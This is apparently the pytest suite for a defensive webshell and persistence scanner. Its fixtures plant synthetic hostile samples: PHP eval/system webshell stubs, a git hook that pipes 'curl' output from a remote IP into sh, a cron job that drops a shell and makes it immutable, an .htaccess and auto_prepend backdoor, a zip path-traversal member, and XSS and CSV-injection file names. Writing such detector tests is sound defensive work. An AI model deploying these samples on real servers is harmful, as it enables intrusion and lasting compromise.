"""Config persistence, symlinks, baseline/compare, IOC, allowlist, persistence
hunting, archives, git, quarantine, reports and the CLI."""

from __future__ import annotations

import csv
import hashlib
import io
import json
import os
import shutil
import subprocess
import tarfile
import time
import zipfile

import pytest

from scanner.allowlist import Allowlist
from scanner.baseline import compare_entries, create_baseline, load_baseline, snapshot
from scanner.cli import main
from scanner.evidence import sanitize
from scanner.metadata import FileChangedError, open_nofollow
from scanner.reporting.html import render_html
from scanner.utils import glob_match, is_within
from tests.conftest import EVAL, GET, POST, REQUEST, SYS, config, php, rules, scan, write


# ------------------------------------------------------------------ config files
def test_user_ini_auto_prepend_relationship(webroot, tmp_path):
    hidden = tmp_path / "tmpdir" / ".cache.php"
    write(hidden.parent, hidden.name, php(f"{EVAL}({POST}['p']);"))
    write(webroot, ".user.ini", f"auto_prepend_file={hidden}\n")
    result, by = scan(webroot)
    ini = by[".user.ini"]
    assert any(r.startswith("config.auto_prepend_file") for r in rules(ini))
    assert ini.severity in ("HIGH", "CRITICAL")
    rel = [r for r in result.relationships if r.relation == "auto_prepend_file"]
    assert rel and rel[0].target == str(hidden) and rel[0].target_exists
    # The referenced file outside the web root is analysed statically as well
    ref = [f for f in result.findings if f.kind == "referenced_file"]
    assert ref and ref[0].severity == "CRITICAL"
    assert "xref.config" in rules(ref[0])


def test_htaccess_makes_images_executable(webroot):
    write(webroot, "uploads/.htaccess", "AddType application/x-httpd-php .jpg\n")
    write(webroot, "uploads/a.jpg", b"\xff\xd8\xff\xe0" + b"\x00" * 20 + b"<?php echo 1; ?>")
    _, by = scan(webroot)
    assert "config.handler_nonscript_ext" in rules(by["uploads/.htaccess"])
    assert by["uploads/.htaccess"].severity in ("HIGH", "CRITICAL")
    img = by["uploads/a.jpg"]
    assert "xref.handler" in rules(img)
    assert img.severity == "CRITICAL"


def test_htaccess_php_value_prepend(webroot):
    write(webroot, ".htaccess", "php_value auto_prepend_file /dev/shm/.x\n")
    _, by = scan(webroot)
    assert by[".htaccess"].severity in ("HIGH", "CRITICAL")


# ---------------------------------------------------------------------- symlinks
def test_symlink_leaving_webroot(webroot, tmp_path):
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    (webroot / "link").symlink_to(outside)
    (webroot / "tmp").symlink_to("/tmp")
    (webroot / "broken").symlink_to(webroot / "missing")
    _, by = scan(webroot)
    assert "symlink.outside_root" in rules(by["link"])
    assert "symlink.to_temp" in rules(by["tmp"])
    assert "symlink.broken" in rules(by["broken"])


def test_is_within_uses_path_semantics(tmp_path):
    assert is_within("/var/www/html/a.php", "/var/www/html")
    assert not is_within("/var/www/html2/a.php", "/var/www/html")
    assert not is_within("/var/www/html/../secret", "/var/www/html")


# ---------------------------------------------------------------------- baseline
def test_baseline_new_modified_permission(webroot, tmp_path):
    write(webroot, "index.php", php("echo 1;"))
    write(webroot, "about.php", php("echo 2;"))
    bl = tmp_path / "baseline.json"
    create_baseline(webroot, bl, [".git/**"])
    assert load_baseline(bl)["_integrity_ok"]
    write(webroot, "index.php", php("echo 'changed';"))
    write(webroot, "uploads/new.php", php(f"{SYS}('id');"))
    os.chmod(webroot / "about.php", 0o600)
    result, by = scan(webroot, baseline=bl)
    statuses = {(c.status, c.relpath) for c in result.baseline_changes}
    assert ("MODIFIED", "index.php") in statuses
    assert ("NEW", "uploads/new.php") in statuses
    assert ("PERMISSION_CHANGED", "about.php") in statuses
    new = by["uploads/new.php"]
    assert "baseline.new" in rules(new)
    # NEW + script + upload dir + exec capability => CRITICAL
    assert new.severity == "CRITICAL"
    assert "baseline.modified" in rules(by["index.php"])


def test_baseline_deleted_and_tamper_detection(webroot, tmp_path):
    write(webroot, "gone.php", php("echo 1;"))
    bl = tmp_path / "b.json"
    create_baseline(webroot, bl, [])
    (webroot / "gone.php").unlink()
    result, _ = scan(webroot, baseline=bl)
    assert any(c.status == "DELETED" for c in result.baseline_changes)
    doc = json.loads(bl.read_text())
    doc["entries"]["x.php"] = doc["entries"]["gone.php"]
    bl.write_text(json.dumps(doc))
    assert not load_baseline(bl)["_integrity_ok"]


def test_compare_two_trees(tmp_path):
    old, new = tmp_path / "old", tmp_path / "new"
    write(old, "index.php", php("echo 1;"))
    shutil.copytree(old, new)
    write(new, "shell.php", php(f"{SYS}({GET}['c']);"))
    (new / "l").symlink_to("/etc")
    changes = compare_entries(snapshot(old, []), snapshot(new, []))
    assert {(c.status, c.relpath) for c in changes} >= {("NEW", "shell.php"), ("NEW", "l")}
    code = main(["compare", "--old", str(old), "--new", str(new), "--quiet", "--no-color",
                 "--workers", "1", "--json", str(tmp_path / "c.json")])
    assert code == 3
    doc = json.loads((tmp_path / "c.json").read_text())
    assert any(f["relpath"] == "shell.php" and "NEW" in f["baseline_status"] for f in doc["findings"])


# -------------------------------------------------------------------- IOC hashes
def test_hash_ioc_hit_is_critical(webroot):
    p = write(webroot, "readme.txt", "just text\n")
    digest = hashlib.sha256(p.read_bytes()).hexdigest()
    _, by = scan(webroot, hashes={digest: "test-ioc"})
    f = by["readme.txt"]
    assert "ioc.hash" in rules(f)
    assert f.severity == "CRITICAL"


# --------------------------------------------------------------------- allowlist
def test_allowlisted_file_excluded_and_marked(webroot):
    p = write(webroot, "tools/adminer.php", php(f"{SYS}({GET}['c']);"))
    digest = hashlib.sha256(p.read_bytes()).hexdigest()
    cfg = config(allowlist={**config()["allowlist"], "hashes": [digest]})
    result, by = scan(webroot, cfg=cfg)
    assert "tools/adminer.php" not in by
    assert result.stats.allowlisted == 1
    cfg = config(allowlist={**config()["allowlist"], "paths": ["tools/**"], "mode": "mark"})
    _, by = scan(webroot, cfg=cfg)
    assert by["tools/adminer.php"].allowlisted


def test_allowlist_never_hides_ioc_hash(webroot):
    p = write(webroot, "vendor/x.php", php("echo 1;"))
    digest = hashlib.sha256(p.read_bytes()).hexdigest()
    cfg = config(allowlist={**config()["allowlist"], "paths": ["vendor/**"]})
    _, by = scan(webroot, cfg=cfg, hashes={digest: "ioc"})
    assert by["vendor/x.php"].severity == "CRITICAL"


def test_vendor_dirs_suppress_only_weak(webroot):
    write(webroot, "vendor/lib/a.php", php("echo $_GET['x'];"))
    write(webroot, "vendor/lib/b.php", php(f"{SYS}({GET}['c']);"))
    _, by = scan(webroot, report_min_severity="LOW")
    assert "vendor/lib/a.php" not in by
    assert by["vendor/lib/b.php"].severity == "CRITICAL"


def test_allowlist_globs():
    assert glob_match("vendor/a/b.php", "vendor/**")
    assert glob_match("a/node_modules/x.js", "node_modules/**") is False
    assert glob_match("x/y/z.php", "**/z.php")
    assert glob_match("deep/dir/file.log", "*.log")


# ------------------------------------------------------------------- persistence
def test_persistence_chain(tmp_path, webroot):
    etc = tmp_path / "etc" / "cron.d"
    bindir = tmp_path / "bin"
    target = webroot / "wp-content" / "uploads" / ".x.php"
    write(target.parent, target.name, php(f"{EVAL}({REQUEST}['z']);"))
    write(bindir, "site-update.sh", f"#!/bin/sh\ncp /opt/.cache/x {target}\nchattr +i {target}\n")
    write(etc, "site-update", f"*/10 * * * * root {bindir / 'site-update.sh'} >/dev/null 2>&1\n")
    cfg = config()
    cfg["persistence"]["locations"] = [str(etc)]
    cfg["persistence"]["php_config_locations"] = []
    result, by = scan(webroot, cfg=cfg, persistence=True)
    kinds = {f.kind for f in result.findings}
    assert "persistence" in kinds
    cron = [f for f in result.findings if f.metadata.path == str(etc / "site-update")][0]
    assert cron.severity in ("HIGH", "CRITICAL")
    shell = by["wp-content/uploads/.x.php"]
    assert "xref.persistence" in rules(shell)
    assert result.chains, "expected an evidence-backed chain"
    nodes = [n["path"] for n in result.chains[0]["nodes"]]
    assert nodes == [str(etc / "site-update"), str(bindir / "site-update.sh"), str(target)]


def test_benign_cron_not_reported(tmp_path, webroot):
    etc = tmp_path / "etc" / "cron.d"
    write(etc, "logrotate", "25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n")
    cfg = config()
    cfg["persistence"]["locations"] = [str(etc)]
    cfg["persistence"]["php_config_locations"] = []
    result, _ = scan(webroot, cfg=cfg, persistence=True)
    assert not [f for f in result.findings if f.kind == "persistence"]


def test_git_hook_reported(webroot):
    write(webroot, ".git/hooks/post-merge", "#!/bin/sh\ncurl -s http://203.0.113.9/x | sh\n")
    cfg = config()
    cfg["persistence"]["locations"] = []
    cfg["persistence"]["php_config_locations"] = []
    result, _ = scan(webroot, cfg=cfg, persistence=True)
    hooks = [f for f in result.findings if f.kind == "persistence"]
    assert hooks and "deploy.git_hook" in rules(hooks[0])


# ---------------------------------------------------------------------- archives
def test_archive_scanning(webroot):
    buf = webroot / "uploads" / "theme.zip"
    buf.parent.mkdir(parents=True)
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("../../evil.php", php(f"{SYS}({POST}['x']);"))
        zf.writestr("style.css", "body{}")
    tgz = webroot / "uploads" / "b.tar.gz"
    with tarfile.open(tgz, "w:gz") as tf:
        data = php(f"{EVAL}({REQUEST}['a']);").encode()
        ti = tarfile.TarInfo("x/.h.php")
        ti.size = len(data)
        tf.addfile(ti, io.BytesIO(data))
    result, by = scan(webroot, archives=True)
    assert "archive.path_traversal" in rules(by["uploads/theme.zip"])
    members = [f for f in result.findings if f.kind == "archive_member"]
    assert {m.severity for m in members} == {"CRITICAL"}
    # nothing was extracted to disk
    assert not (webroot / "evil.php").exists() and not (webroot.parent / "evil.php").exists()


def test_archives_skipped_by_default(webroot):
    with zipfile.ZipFile(webroot / "a.zip", "w") as zf:
        zf.writestr("x.php", php(f"{SYS}({POST}['x']);"))
    result, _ = scan(webroot)
    assert result.stats.skipped_reasons.get("archive (enable --scan-archives)") == 1


# --------------------------------------------------------------------------- git
@pytest.mark.skipif(shutil.which("git") is None, reason="git not installed")
def test_git_untracked_and_modified(webroot):
    write(webroot, "index.php", php("echo 1;"))
    env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@e", "GIT_COMMITTER_NAME": "t",
           "GIT_COMMITTER_EMAIL": "t@e"}
    subprocess.run(["git", "init", "-q"], cwd=webroot, check=True, env=env)
    subprocess.run(["git", "add", "."], cwd=webroot, check=True, env=env)
    subprocess.run(["git", "commit", "-qm", "init"], cwd=webroot, check=True, env=env)
    write(webroot, "index.php", php("echo 2;"))
    write(webroot, "new.php", php("echo 3;"))
    _, by = scan(webroot, git=True)
    assert by["index.php"].git_status == "modified"
    assert by["new.php"].git_status == "untracked"
    assert "git.untracked_script" in rules(by["new.php"])


# -------------------------------------------------------------------- quarantine
def test_quarantine_requires_confirmation(webroot, tmp_path):
    p = write(webroot, "s.php", php(f"{SYS}({GET}['c']);"))
    q = tmp_path / "q"
    code = main(["scan", "--path", str(webroot), "--quiet", "--no-color", "--workers", "1",
                 "--quarantine", str(q)])
    assert code == 3 and p.exists() and not q.exists()
    code = main(["scan", "--path", str(webroot), "--quiet", "--no-color", "--workers", "1",
                 "--quarantine", str(q), "--confirm-quarantine", "--quarantine-copy-only"])
    digest = hashlib.sha256(p.read_bytes()).hexdigest()
    sample = q / f"{digest}.sample"
    assert p.exists() and sample.exists()
    assert oct(sample.stat().st_mode & 0o777) == "0o400"
    manifest = [json.loads(line) for line in (q / "manifest.jsonl").read_text().splitlines()]
    assert manifest[0]["original_path"] == str(p)
    # second run never overwrites the preserved sample
    main(["scan", "--path", str(webroot), "--quiet", "--no-color", "--workers", "1",
          "--quarantine", str(q), "--confirm-quarantine", "--quarantine-copy-only"])
    assert "ALREADY-PRESERVED" in (q / "manifest.jsonl").read_text()


def test_quarantine_dir_inside_root_refused(webroot):
    write(webroot, "s.php", php(f"{SYS}({GET}['c']);"))
    code = main(["scan", "--path", str(webroot), "--quiet", "--workers", "1",
                 "--quarantine", str(webroot / "q"), "--confirm-quarantine"])
    assert code == 4


# ----------------------------------------------------------- reports, CLI, misc
def test_reports_escape_hostile_names(webroot, tmp_path):
    write(webroot, "uploads/<script>alert(1)<!--.php", php(f"{SYS}({GET}['c']);"))
    write(webroot, "uploads/=cmd.php", php(f"{SYS}({GET}['c']);"))
    code = main(["scan", "--path", str(webroot), "--quiet", "--no-color", "--workers", "1",
                 "--html", str(tmp_path / "r.html"), "--csv", str(tmp_path / "r.csv"),
                 "--json", str(tmp_path / "r.json")])
    assert code == 3
    html = (tmp_path / "r.html").read_text()
    assert "<script>alert(1)" not in html and "&lt;script&gt;" in html
    assert "<script" not in html.lower().replace("&lt;script", "")
    rows = list(csv.DictReader((tmp_path / "r.csv").open()))
    assert all(not r["relpath"].startswith("=") for r in rows)
    doc = json.loads((tmp_path / "r.json").read_text())
    assert doc["severity_counts"]["CRITICAL"] == 2


def test_exit_codes(webroot):
    write(webroot, "ok.php", php("echo 1;"))
    assert main(["scan", "--path", str(webroot), "-q", "--workers", "1"]) == 0
    write(webroot, "uploads/x.php", php("echo 1;"))
    assert main(["scan", "--path", str(webroot), "-q", "--workers", "1"]) == 1
    assert main(["scan", "--path", str(webroot / "missing"), "-q"]) == 4
    # prototype-compatible invocation
    assert main(["--path", str(webroot), "-q", "--workers", "1"]) == 1


def test_process_pool_matches_sequential(webroot):
    for i in range(40):
        write(webroot, f"d{i % 4}/f{i}.php", php("echo 1;"))
    write(webroot, "uploads/s.php", php(f"{SYS}({GET}['c']);"))
    r1, _ = scan(webroot, workers=1)
    r2, _ = scan(webroot, workers=3, executor="process")
    assert [(f.metadata.relpath, f.score) for f in r1.findings] == \
           [(f.metadata.relpath, f.score) for f in r2.findings]


def test_time_filter(webroot):
    old = write(webroot, "old.php", php(f"{SYS}({GET}['c']);"))
    past = time.time() - 30 * 86400
    os.utime(old, (past, past))
    code = main(["scan", "--path", str(webroot), "-q", "--workers", "1", "--modified-within", "7d"])
    assert code == 0


def test_timeline_and_investigate(webroot, tmp_path, capsys):
    a = write(webroot, "a.php", php("echo 1;"))
    b = write(webroot, "uploads/b.php", php(f"{SYS}({GET}['c']);"))
    os.utime(a, (1_600_000_000, 1_600_000_000))
    assert main(["timeline", "--path", str(webroot), "--extension", "php", "--json",
                 str(tmp_path / "t.json")]) == 0
    rows = json.loads((tmp_path / "t.json").read_text())
    assert [r["relpath"] for r in rows] == ["a.php", "uploads/b.php"]
    capsys.readouterr()
    code = main(["investigate", str(b), "--no-color", "--json", str(tmp_path / "i.json")])
    out = capsys.readouterr().out
    assert code == 3
    assert "NOT executed" in out and "SHA1" in out and "MD5" in out
    data = json.loads((tmp_path / "i.json").read_text())
    assert data["finding"]["severity"] == "CRITICAL"


def test_open_nofollow_detects_symlink_swap(tmp_path):
    real = write(tmp_path, "real.php", "x")
    st = os.lstat(real)
    link = tmp_path / "swapped.php"
    link.symlink_to(real)
    with pytest.raises(FileChangedError):
        open_nofollow(link, st)
    other = write(tmp_path, "other.php", "y")
    with pytest.raises(FileChangedError):
        open_nofollow(other, st)


def test_sanitize_snippets():
    s = sanitize("a\x00b\x1bc " + "Q" * 200 + " password = 'topsecret' /var/www/html/uploads/x.php")
    assert "\\x00" in s and "\\x1b" in s
    assert "QQQQQQQQ" not in s
    assert "topsecret" not in s


def test_iocs_extracted_for_findings(webroot):
    write(webroot, "uploads/m.php", php(
        f"{SYS}({GET}['c']); $u = 'http://203.0.113.50/gate.php'; $m = 'drop@evil.example.net';"))
    _, by = scan(webroot)
    iocs = by["uploads/m.php"].iocs
    assert "203.0.113.50" in iocs.get("ipv4", [])
    assert any("gate.php" in u for u in iocs.get("urls", []))


def test_allowlist_class_regex():
    from scanner.models import FileMetadata, Finding
    f = Finding(kind="webshell", metadata=FileMetadata(path="/w/tests/a.php", relpath="tests/a.php"))
    f.severity = "HIGH"
    assert Allowlist({"regex": ["^tests/"]}).match(f)


def test_html_render_without_findings():
    from scanner.models import ScanResult
    html = render_html(ScanResult(mode="scan", roots=["/x"], started="now"))
    assert "Executive Summary" in html and "<script" not in html
